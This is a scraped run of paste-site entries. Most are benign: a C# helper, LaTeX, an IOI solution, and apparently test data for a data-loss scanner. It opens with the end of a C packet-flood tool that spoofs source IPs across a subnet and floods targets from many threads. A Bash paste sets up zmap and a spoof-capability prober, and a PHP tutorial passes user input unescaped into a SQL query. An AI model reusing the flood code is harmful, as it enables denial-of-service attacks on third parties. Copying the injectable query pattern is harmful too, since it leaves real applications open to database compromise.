  /* Get the octet values from both the network and broadcast addresses, 
  to be used as minimum and maximum IPs for the range. */
  extractIpOctets(networkAddress, network_octets);
  extractIpOctets(broadcastAddress, broadcast_octets);
  int ips = 0;
  // printf(""Generated IPs:\n"");
  for (int a = network_octets[0]; a <= broadcast_octets[0]; a++) {
    for (int b = network_octets[1]; b <= broadcast_octets[1]; b++) {
      for (int c = network_octets[2]; c <= broadcast_octets[2]; c++) {
        for (int d = network_octets[3]; d <= broadcast_octets[3]; d++) {
          sins[ips].sin_family = AF_INET;
          char ipAddr[16]; //String for the currently generating IP
          snprintf(ipAddr, 16, ""%d.%d.%d.%d"", a, b, c, d); //Format the IP string from the individual octets
          sins[ips].sin_addr.s_addr = inet_addr(ipAddr); //Set the IP address as the packet source address for this socket
          ips++;
          // printf(""%d: %s\n"", ips, ipAddr);
        }
      }
    }
  }
  struct thread_data td[num_threads];
  for (i = 0; i < num_threads; i++) {
    td[i].thread_id = i;
    td[i].sins = sins;
    td[i].num_ips = num_ips;
    td[i].list_node = current;
    pthread_create(&thread[i], NULL, &flood, (void *)&td[i]);
  }
  fprintf(stdout, ""Yeeting\n"");
  for (i = 0; i < (atoi(argv[6]) * multiplier); i++) {
    usleep((1000 / multiplier) * 1000);
    if ((pps * multiplier) > maxpps) {
      if (1 > limiter) {
        sleeptime += 100;
      } else {
        limiter--;
      }
    } else {
      limiter++;
      if (sleeptime > 25) {
        sleeptime -= 25;
      } else {
        sleeptime = 0;
      }
    }
    pps = 0;
  }
  return 0;
}"
AHNDxz1m,Untitled,MadCortez,C#,Tuesday 27th of June 2023 11:09:56 AM CDT,"using MyCloud.Models;

namespace MyCloud.Helpers
{
    public static class GetFilesHelper
    {
        public static List<FileData> GetUserFiles(string path)
        {
            var directory = new DirectoryInfo(path);
            List<FileData> returnFiles = new List<FileData>();
            var files = directory.GetFiles();
            foreach(var file in files)
            {
                FileData toAdd = new FileData();
                toAdd.FileName = file.Name;
                toAdd.Path = file.ToString();
                toAdd.Weight = file.Length;
                toAdd.CreateDate = file.LastAccessTime;
                toAdd.AllMemory = file.Length;
                returnFiles.Add(toAdd);
            }
            return returnFiles;
        }
    }
}
"
VWHEQ3Y3,check if server spoofs (debian/ubuntu),NullRout3d,Bash,Tuesday 27th of June 2023 11:06:39 AM CDT,"apt-get update -y
apt-get upgrade -y
apt-get install sudo gcc g++ make curl wget nano protobuf-compiler bison flex libssl-dev libpcap0.8-dev libuv1-dev screen zmap -y
#wget https://github.com/protocolbuffers/protobuf/releases/download/v23.3/protobuf-23.3.tar.gz
#tar -xzvf protobuf-23.3.tar.gz
#cd protobuf-23.3
#./configure
#make
#make install
#cd ..
sleep 1
wget https://www.tcpdump.org/release/libpcap-1.10.4.tar.gz
tar -xzvf libpcap-1.10.4.tar.gz
cd libpcap-1.10.4
./configure
make
make install
cd ..
sleep 1
wget https://www.caida.org/projects/spoofer/downloads/spoofer-1.4.12.tar.gz
tar -xzvf spoofer-1.4.12.tar.gz
cd spoofer-1.4.12
./configure
make
make install
cd prober
./spoofer-prober
echo ""Done!"""
FPuPJ4mW,opendyslualatex,cpierquet,Latex,Tuesday 27th of June 2023 11:02:43 AM CDT,"%!TEX lualatex

\documentclass[a4paper,french,11pt]{article}
\usepackage{unicode-math}
\setmainfont{OpenDyslexic}
\setmathfont{Fira Math}
\setmathfont{OpenDyslexic Italic}[range=it/{Latin,latin}]
\setmathfont{OpenDyslexic}[range={""01-""FF,up}]
\setmonofont{OpenDyslexic}
\setsansfont{OpenDyslexic}
\usepackage[most]{tcolorbox}
\definecolor{JauneFonce}{HTML}{F2CB62}
\definecolor{BleuTitre}{HTML}{0D61AF}
\usepackage{lipsum}
\usetikzlibrary{decorations,decorations.pathmorphing}

\newtcolorbox{BoiteDys}[1]{%
	enhanced,empty,boxrule=1.25pt,%
	before skip=0.5em,after skip=0.5em,top=4mm,%
	underlay={%
		\tikzset{overlay=false}
		\draw[draw=black,fill=JauneFonce,decorate,decoration={random steps,segment length=10mm,amplitude=0.6pt},ultra thick] (frame.north west) rectangle (frame.south east) ;
		\node[inner sep=4pt,rounded corners=3pt,draw=BleuTitre,line width=1.25pt,rectangle,fill=BleuTitre,anchor=west,xshift=2.5mm,text=white] at (frame.north west) {#1} ;
		}%
}

\begin{document}

\begin{BoiteDys}{Mon titre}
\lipsum[1][1-3]

Et en math $f(x)=2x+1 +\dfrac{1}{x}$ ; $g(x)=\left(x^2+1\right)^3$.

$\displaystyle\int_0^4 x \rm{d}x = ?$.

$A = \dfrac{\rm{base} \times \rm{hauteur}}{2}$.
\end{BoiteDys}

\end{document}"
9ivBc36m,Corso recupero Javascript - video 16,fcamuso,JavaScript,Tuesday 27th of June 2023 10:33:57 AM CDT,"//PAGINA HTML
<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Document</title>
</head>
<body>
    <form id=""formElem"">
        Inserisci cognome<input type=""text"" id=""cognome"" name=""cognome"">
        <input type=""button"" id=""bottone"" value=""invia"">
    </form>
      
    <div id=""livello""></div>
    <script>
        
        document.getElementById(""bottone"").addEventListener(""click"", invia);
        async function invia() 
        {
              
            //volendo usare POST ...
            //let ogg_form = document.getElementById(""formElem"");
            // let ogg_formData = new FormData(ogg_form);
            // const myRequest = new Request(""elabora5_elenco_atletiJSON.php"", {
            //     method: ""POST"",
            //     body: ogg_formData
            // });
            //let response = await fetch(myRequest);
            
            let parametro_get = document.getElementById(""cognome"").value;
            let response = await fetch(""elabora5_elenco_atletiJSON.php?cognome=""+parametro_get);
            console.log(response);
            if (response.ok) 
            {                 
                let risposta = await response.json();
                console.log(risposta)
                
                const div = document.getElementById(""livello"");
    
                div.insertAdjacentHTML(""beforeend"", ""<ul>"");
                risposta.atleti.forEach(atleta => {
                  div.insertAdjacentHTML(""beforeend"", ""<li>"" + atleta.cognome+
                    "" ""+atleta.nome+""</li>"");
                });
                div.insertAdjacentHTML(""beforeend"", ""</ul>"");
                
                
            }
            else
            {               
                console.log(err);
            }
        } 
        
    </script>
</body>
</html>


//PAGINA PHP
<?php
    include ""connessione.php"";

    //richiamando nel browser, per fare dei test, direttamente 
    //questa pagina sarà come se si fosse inviato da form o via fetch
    //il parametro di ricerca 'ros'
    //$cognome = isset($_POST['cognome']) ? $_POST['cognome'] : ""ros"";
    
    //se POST  ...
    //$cognome = $_POST['cognome'];

    //se GET
    $cognome = $_GET['cognome'];

    $sql = ""select nome,cognome from atleti"".
        "" where cognome like '{$cognome}%' order by cognome, nome"";
    $risultato = mysqli_query($conn,$sql);

    //modello formato json che vogliamo restituire
    //{""atleti"":[{""nome"":""pietro"",""cognome"":""rosa""},{""nome"":""luigi"",""cognome"":""rossi""},{""nome"":""maria"",""cognome"":""rossi""}]}
    $righe = array();
  
    while($atleta = mysqli_fetch_assoc($risultato))
       $righe['atleti'][] = $atleta; //$atleta == [""nome""=>""pietro, ""cognome""=>""rosa""]

    //$righe == ['atleti'][[""nome""=>""pietro"", ""cognome""=>""rosa""], [""nome""=>""luigi"", ""cognome""=>""rossi""], ...   ]
    
    mysqli_close($conn);
    
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($righe);
?>
"
4UnLtErz,IOI '08 P2 - Islands (316.16 MB),erek1e,C++,Tuesday 27th of June 2023 10:16:25 AM CDT,"#include <iostream>
#include <vector>
#include <algorithm>

using namespace std;

const long long INF = 1e18;

vector<vector<pair<int, int>>> g;
vector<vector<int>> edgeId;

// DFS to find cycle
vector<bool> inPath;
vector<pair<int, int>> path; // node, weight from previous node
bool dfsCycle(int node, int parentEdge = 0) {
    if (inPath[node]) return true;
    inPath[node] = true;
    for (size_t i = 0; i < g[node].size(); ++i) {
        auto [child, w] = g[node][i];
        int e = edgeId[node][i];
        if (e != parentEdge) {
            path.emplace_back(child, w);
            if (dfsCycle(child, e)) return true;
            path.pop_back();
        }
    }
    inPath[node] = false;
    return false;
}

// DFS to mark as seen
vector<bool> seen;
void dfsComponent(int node) {
    seen[node] = true;
    for (auto [child, w] : g[node]) {
        if (!seen[child]) dfsComponent(child);
    }
}

// DFS to find max path length without moving to any banned nodes (may start at a banned node)
vector<bool> bannedNode; // (on cycle)
pair<long long, long long> findMaxPath(int node, int parent = 0) { // (max path starting here, max path in subtree)
    vector<long long> biggestPathsStartingHere;
    long long maxPathFromNode = 0, maxPathInSubtree = 0;
    for (auto [child, w] : g[node]) {
        if (child == parent || bannedNode[child]) continue;
        auto [a, b] = findMaxPath(child, node);
        a += w;
        maxPathFromNode = max(maxPathFromNode, a);
        maxPathInSubtree = max(maxPathInSubtree, b);
        biggestPathsStartingHere.push_back(a);
        sort(biggestPathsStartingHere.rbegin(), biggestPathsStartingHere.rend());
        if (biggestPathsStartingHere.size() > 2) biggestPathsStartingHere.pop_back();
    }
    long long newPath = 0;
    if (biggestPathsStartingHere.size() == 1) newPath = biggestPathsStartingHere[0];
    else if (!biggestPathsStartingHere.empty()) newPath = biggestPathsStartingHere[0] + biggestPathsStartingHere[1];
    maxPathInSubtree = max(maxPathInSubtree, newPath);
    return {maxPathFromNode, maxPathInSubtree};
}

int main() { 
    ios_base::sync_with_stdio(0); cin.tie(0); cout.tie(0);
    int n; cin >> n;
    g.resize(1+n), edgeId.resize(1+n);
    for (int u = 1; u <= n; ++u) {
        int v, w; cin >> v >> w;
        g[u].emplace_back(v, w);
        g[v].emplace_back(u, w);
        edgeId[u].push_back(u);
        edgeId[v].push_back(u);
    }

    // treat components separately
    long long totalW = 0;
    inPath.resize(1+n), seen.resize(1+n), bannedNode.resize(1+n);
    for (int r = 1; r <= n; ++r) {
        if (seen[r]) continue;
        
        // Mark component as seen
        dfsComponent(r);

        // Find cycle
        path.clear();
        path.emplace_back(r, 0);
        dfsCycle(r);
        vector<pair<int, int>> cycle;
        int last = path.back().first;
        int cur = (int)path.size()-1;
        
        do {
            cycle.push_back(path[cur--]);
        } while (path[cur].first != last);
        reverse(cycle.begin(), cycle.end());
        int m = cycle.size();
        for (auto [node, w] : cycle) bannedNode[node] = true;
        
        // Find longest path in each direction from the cycle
        long long maxPath = 0;
        vector<long long> pathFrom(m);
        for (int i = 0; i < m; ++i) {
            auto [pathFromI, subtreePath] = findMaxPath(cycle[i].first);
            maxPath = max(maxPath, subtreePath);
            pathFrom[i] = pathFromI;
        }

        // Try combining pairs of paths leaving the cycle
        long long S = 0;
        for (int i = 0; i < m; ++i) S += cycle[i].second;

        long long mxSum = -INF, mxDif = -INF; // max path + prefix, max path - prefix, over all j considered so far
        long long prefix = 0;
        for (int j = 0; j < m; ++j) {
            long long path = pathFrom[j];
            prefix += cycle[j].second;

            // i to j clockwise
            long long a = path + prefix + mxDif;
            // j to i clockwise
            long long b = S + path - prefix + mxSum;
            maxPath = max({maxPath, a, b});

            mxSum = max(mxSum, path+prefix);
            mxDif = max(mxDif, path-prefix);
        }

        totalW += maxPath;
    }
    cout << totalW << endl;
    return 0;
}"
brDfbrq6,Advanced AND - Donald AND Duck AND Hello,wheresTheAnyKey,C,Tuesday 27th of June 2023 10:07:40 AM CDT,"Pasted at: 27/06/2023 16:07
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND
hello, donald was a duck

5502491997132108

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH
"
b5mT0KqB,Financial What's Inside - Email/IP/Bank,wheresTheAnyKey,C,Tuesday 27th of June 2023 10:07:38 AM CDT,"Pasted at: 27/06/2023 16:07
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3
What's Inside Paste 

5378496492418234
5571598708435236
5587663820997281
5502491997132108
5516931903918995
5322909948799236
5443317136071703
5409137465238695
5497550044220575
5559606180091553

aaribaud@att.net
aaribaud@comcast.net
aaribaud@att.com
aaribaud@att.co.uk
aaribaud@yahoo.com

246.107.72.199
221.187.199.189
3.109.3.44
109.112.85.139
250.83.213.179
169.141.201.234
50.180.50.59
20.181.54.231
64.235.191.167
48.103.36.43"
h2PKfCDk,Financial with SPECIAL CHARACTERS,wheresTheAnyKey,C,Tuesday 27th of June 2023 10:07:36 AM CDT,"Pasted at: 27/06/2023 16:07
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND

5148-2121-6312-7114   - DASHES
5148212163127114
5107-4578-0576-9075   - DASHES
5107457805769075
3488-1760-1454-729   - DASHES
348817601454729

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH"
QcFqDGGi,Domains with SPECIAL CHARS,wheresTheAnyKey,C,Tuesday 27th of June 2023 10:07:35 AM CDT,"Pasted at: 27/06/2023 16:07
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND

www.qatesting.com
blog.qatesting.com
www.qatesting.com/index.html
www.qatesting.com/home
www.qatestingblog.com
www.qatestingtutorials.com
shop.qatesting.co.uk
admin.qatesting.io 
qatesting
qatesting.co.uk
qatesting.cn
qatesting.io
findmetesting.com
www.qatesting-blog.com
www.qatesting-blog23.com
www.qatesting
www.qatesting.co.uk
www.qatesting.cn
www.qatesting.io
www.findmetesting.com
www.wobsut.gov

The difference is that QA is process oriented and QC is product oriented.

Testing, therefore is product oriented and thus is in the QC domain. Testing for quality isn't assuring quality, it's controlling it.



Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH
"
bJajmUUA,ALL Keywords with Excluded Words,wheresTheAnyKey,C,Tuesday 27th of June 2023 10:07:33 AM CDT,"Pasted at: 27/06/2023 16:07
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND 

The dystopian version of superintelligence is illustrated with frequency by leaders in the technology industry, and is famously depicted by Hollywood in films like Terminator, 
or more recently Ex Machina, and even the Avengers. The “furious deity A.I.” is a story you know, because it is the story you are constantly told: we build the thinking machine, 
it surpasses our abilities in every way, and it destroys us for one of any number of reasons.Maybe it perceives us as a threat. Maybe we’re just in its way, 
and it hardly perceives us at all — mankind, a disposable insect race.

There are of course many arguments in opposition to the now ubiquitous concept of our apocalypse by artificial intelligence. 
I myself have called into question the logic of such dystopian arguments in Anatomy of Next. But our subject here is less pertaining to the nature of the conscious machine than 
it is to the way we talk about this subject, and what it means. First, consider that most of the artificial intelligence depicted in culture looks human, a representation with 
no basis in technological reality. Then, the true scope of the Singularity is almost impossible to predict, which begs a question: where are these opinions about the broadly 
unknowable coming from?"
WcDFY6z8,All Keywords with ANY Additional Words,wheresTheAnyKey,C,Tuesday 27th of June 2023 10:07:32 AM CDT,"Pasted at: 27/06/2023 16:07
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND KEYWAUTO

The dystopian version of superintelligence is illustrated with frequency by leaders in the technology industry, and is famously depicted by Hollywood in films like Terminator, or more recently Ex Machina, and even the Avengers. The “angry god A.I.” is a story you know, because it is the story you are constantly told: we build the thinking machine, it surpasses our abilities in every way, and it destroys us for one of any number of reasons.
Maybe it perceives us as a threat. Maybe we’re just in its way, and it hardly perceives us at all — humanity, a disposable insect race.

There are of course many arguments in opposition to the now ubiquitous concept of our apocalypse by artificial intelligence. I myself have called into question the logic of such dystopian arguments in Anatomy of Next. But our subject here is less pertaining to the nature of the conscious machine than it is to the way we talk about this subject, and what it means. First, consider that most of the artificial intelligence depicted in culture looks human, a representation with no basis in technological reality. Then, the true scope of the Singularity is almost impossible to predict, which begs a question: where are these opinions about the broadly unknowable coming from?

6589745854123698

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH
"
qvpbZmaB,IP with SPECIAL CHARACTERS,wheresTheAnyKey,C,Tuesday 27th of June 2023 10:07:28 AM CDT,"Pasted at: 27/06/2023 16:07
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND

123.123.123.149
123.123.123.7
123.123.123.186
123.123.123.47
123.123.123.187
123.123.123.47
123.123.123.130
123.123.123.62
123.123.123.87
123.123.123.1
123.123.123.61
123.123.123.1
123.123.123.65
123.123.123.65
123.123.123.189
123.123.123.193
123.123.123.78
123.123.123.142
123.123.123.107
123.123.123.126
123.123.123.13
123.123.123.171
123.123.123.45
123.123.123.61
123.123.123.93
123.123.123.2
123.123.123.71
123.123.123.41
123.123.123.184
123.123.123.74
123.123.123.106
123.123.123.171
123.123.123.188
123.123.123.177
123.123.123.185
123.123.123.9
123.123.123.184
123.123.123.100
123.123.123.31
123.123.123.164
123.123.123.184
123.123.123.12
123.123.123.153
123.123.123.72
123.123.123.44
123.123.123.119
123.123.123.119
123.123.123.163
123.123.123.38
123.123.123.67
123.123.123.59
123.123.123.10
123.123.123.50
123.123.123.121
123.123.123.145
123.123.123.159
123.123.123.64
123.123.123.6
123.123.123.39
123.123.123.198
123.123.123.17
123.123.123.65
123.123.123.149
123.123.123.84
123.123.123.8
123.123.123.145
123.123.123.65
123.123.123.94
123.123.123.79
123.123.123.177
123.123.123.67
123.123.123.78
123.123.123.80
123.123.123.79
123.123.123.50
123.123.123.87
123.123.123.15
123.123.123.80
123.123.123.145
123.123.123.75
123.123.123.4
123.123.123.59
123.123.123.59
123.123.123.190
123.123.123.64
123.123.123.63
123.123.123.102
123.123.123.114
123.123.123.146
123.123.123.53
123.123.123.124
123.123.123.30
123.123.123.57
123.123.123.64
123.123.123.69
123.123.123.33
123.123.123.12
123.123.123.73
123.123.123.36
123.123.123.153
100.123.123.50
100.123.123.39
100.123.123.156
100.123.123.56
100.123.123.175
100.123.123.121
100.123.123.114
100.123.123.118
100.123.123.13
100.123.123.174
100.123.123.84
100.123.123.161
100.123.123.63
100.123.123.51
100.123.123.66
100.123.123.190
100.123.123.101
100.123.123.72
100.123.123.24
100.123.123.151
100.123.123.143
100.123.123.146
100.123.123.117
100.123.123.21
100.123.123.10
100.123.123.98
100.123.123.114
100.123.123.6
100.123.123.101
100.123.123.14
100.123.123.147
100.123.123.159
100.123.123.157
100.123.123.6
100.123.123.175
100.123.123.35
100.123.123.136
100.123.123.2
100.123.123.139
100.123.123.11
100.123.123.179
100.123.123.16
100.123.123.40
100.123.123.20
100.123.123.20
100.123.123.150
100.123.123.77
100.123.123.48
100.123.123.22
100.123.123.24
100.123.123.9
100.123.123.187
100.123.123.131
100.123.123.148
100.123.123.152
100.123.123.96
100.123.123.199
100.123.123.15
100.123.123.4
100.123.123.112
100.123.123.62
100.123.123.186
100.123.123.36
100.123.123.136
100.123.123.83
100.123.123.38
100.123.123.120
100.123.123.147
100.123.123.15
100.123.123.134
100.123.123.19
100.123.123.196
100.123.123.115
100.123.123.126
100.123.123.39
100.123.123.193
100.123.123.117
100.123.123.115
100.123.123.115
100.123.123.33
100.123.123.121
100.123.123.72
100.123.123.189
100.123.123.76
100.123.123.78
100.123.123.61
100.123.123.112
100.123.123.176
100.123.123.82
100.123.123.183
100.123.123.168
100.123.123.24
100.123.123.134
100.123.123.145
100.123.123.195
100.123.123.189
100.123.123.157
100.123.123.114
100.123.123.34
100.123.123.166

These are a list of generated IPs for test purPoses. They seRVe no purpose only to act as test data for testing activities.
You might findMEtesting 123.123.123.123 or findmetesting 100.123.123.76. These are my favourite ip addresses 123.123.123.23 100.123.123.23.
These are some random words networking, ipaddresses, studpidIPs


Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH"
6LutTF1S,Hashed Email With Exclude,wheresTheAnyKey,C,Tuesday 27th of June 2023 10:07:27 AM CDT,"Pasted at: 27/06/2023 16:07
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

wojciech@sktestcomcast.net
joglo@sktestmac.com
larry@sktesthotmail.com
aardo@sktestverizon.net
debest@sktestlive.com
carroll@sktestaol.com
arathi@sktestyahoo.ca
sthomas@sktestcomcast.net
leocharre@sktestyahoo.ca
pedwards@sktestyahoo.com

skexclude"
p26UYtSf,Hashed Email - Full,wheresTheAnyKey,C,Tuesday 27th of June 2023 10:07:25 AM CDT,"Pasted at: 27/06/2023 16:07
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

wojciech@sktestcomcast.net
joglo@sktestmac.com
larry@sktesthotmail.com
aardo@sktestverizon.net
debest@sktestlive.com
carroll@sktestaol.com
arathi@sktestyahoo.ca
sthomas@sktestcomcast.net
leocharre@sktestyahoo.ca
pedwards@sktestyahoo.com

skinclude"
mJBRfYqr,Email with Keyword SPECIAL CHARACTERS,wheresTheAnyKey,C,Tuesday 27th of June 2023 10:07:24 AM CDT,"Pasted at: 27/06/2023 16:07
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3 for TESTING PURPOSE ONLY

DATA_ID_TESTDATATOFIND NOEXCLUDES

Cooper.Kleine@findmetesting.co.uk 
Mariquilla.Evenden@findmetesting.co.uk 
Noll.Ingolotti@findmetesting.co.uk  
Grove.Feldbaum@findmetesting.co.uk
Mack.Osment@findmetesting.co.uk 
Trisha.Zanicchelli@findmetesting.co.uk
Jack.Gorriessen@findmetesting.co.uk 
Nefen.Malec@findme-testing.co.uk 
Birdie-Gemmill@findmetesting.co.uk
Rosabella.Nias@findmetesting.co.uk
Ellerey.Fanti@findmetesting.cn
Antonina.Carsey@findmetesting.cn
Valry.Shead@findmetesting.cn 
Conrade.Ferrarone@findmetesting.cn
Neysa.Fazakerley@findmetesting.cn
Cristobal.Primak@findmetesting.cn
Wakefield.Kent@findmetesting.cn
findme.Cheales@findmetesting.cn
Nert.Roddamr@findmetesting.cn 
Richy.Raft@findmetesting.cn
Berget.Kermannes@findmetesting.ie 
Shelden.Tregea@findmetesting.ie 
Allsun.Badrick@findmetesting.ie 
Hortense.Ivkovic@findmetesting.ie
Carolin.Potte@findmetesting.ie
Benjie.Trumble@findmetesting.ie
Andrew.Hadgkiss@findmetesting.ie
Trula.Kuna@findmetesting.ie
Tommie.Maytum@findmetesting.ie
Langsdon.Pakes@findmetesting.ie
Porty.Tooth@findmetesting.au
Rozella.Siggefindmetesting.au
Nolie.Tumultyfindmetesting.au
Dud.Caustonfindmetesting.au
Alvinia.Brameldfindmetesting.au
Meridel.Lymbournefindmetesting.au
Elvis.Maleckfindmetesting.au
Brett.Oughtonfindmetesting.au
Rickard.Clemfindmetesting.au
Prue.Firemanfindmetesting.au
Uriel.Rozenbaum@findmetesting25.com
Cindie.Greeson@findmetesting25.com
Laurette.Puckham@findmetesting25.com
Eldredge.Ricket@findmetesting25.com
Alanah.Rapper@findmetesting25.com
Ash.Le.Prevost@findmetesting25.com
Galvin.Purchon@findmetesting25.com
Lauryn.Ilson@findmetesting25.com
findme.Graffin@findmetesting25.com
Edithe.Trehearne@findmetesting25.com
Den.Cancutt@findmetesting10.com
Wernher.Spatoni@findmetesting10.com
Malchy.Ion@findmetesting10.com
Leona.Whitby@findmetesting10.com
Alphonse.Goodlake@findmetesting10.com
Gran.Standen@findmetesting10.com
Barnie.Gilffilland@findmetesting10.com
Kaylyn.Ditchfield@findmetesting10.com
Dorotea.Kohlerman@findmetesting10.com
Gillan.Lampel@findmetesting10.com
Patrica.Mannakee@findustesting.com
Pippo.Sewart@findustesting.com
Lanae.Cousin@findustesting.com
Porter.Glaysher@findustesting.com
Herschel.Yaakov@findustesting.com
findme.Parsand@findustesting.com
Lucho.Cosh@findustesting.com
Cullie.Powlesland@findustesting.com
Edy.Burkart@findustesting.com
Christophorus.Ackeroyd@findustesting.com
Arvy.Rowson@findUStesting.com
Arlan.Ivanilov@findustesting.com
Tawnya.Waslin@findustesting.com
Inigo.Gyrgorcewicx@findustesting.com
Sharity.Stoodley@findustesting.com
Ginger.Dresse@findustesting.com
Deck.Jouannot@findustesting.com
Deny.Soanes@findustesting.com
james@findmetesting.com

Wenona.Moverley@findqatesting.com
Jerry.Poynter@findqatesting.com
Drugi.Neeson@findqatesting.com
Winny.Binfield@findqatesting.com
Darill.Greenshiels@findqatesting.com
Ethelin.Pinchen@findqatesting.com
Tanney.Ballendine@findqatesting.com
Ariadne.Wincott@findqatesting.com
Winnie.Domm@findqatesting.com
Rogerio.Cudbird@findqatesting.com
Yu@findmetesting.com

RIGHT OF @
findme@findme.testing.com
wildcard@findme*testing.com
dash@findme-testing.com
slash@findme/testing.com
questionmark@findme?testing.com

ACCENTS
Pål@findmetesting.com
Magdalène@findmetesting.com
Anaël@findmetesting.com
Lén@findmetesting.com
Loïs@findmetesting.com
Thérèsa@findmetesting.com
Valérie@findmetesting.com
Görel@findmetesting.com
Mélia@findmetesting.com
Joséphine@findmetesting.com
Loïc@findmetesting.com
findme@findmetesting.com
Méghane@findmetesting.com
Nuó@findmetesting.com
Lén@findmetesting.com
Eliès@findmetesting.com
André@findmetesting.com
Mahélie@findmetesting.com
Méthode@findmetesting.com
Rachèle@findmetesting.com
Mélina@findmetesting.com
Gaëlle@findmetesting.com
Céline@findmetesting.com
Bérangère@findmetesting.com
Françoise@findmetesting.com
Séverine@findmetesting.com
Måns@findmetesting.com
Adèle@findmetesting.com
Aimée@findmetesting.com
Mélia@findmetesting.com
Gösta@findmetesting.com
Laurène@findmetesting.com
Gisèle@findmetesting.com
Mélinda@findmetesting.com
Bécassine@findmetesting.com
Ruì@findmetesting.com
Zoé@findmetesting.com
Maëline@findmetesting.com
Aimée@findmetesting.com
Andréanne@findmetesting.com
Adélaïde@findmetesting.com
Laurène@findmetesting.com
Anaé@findmetesting.com
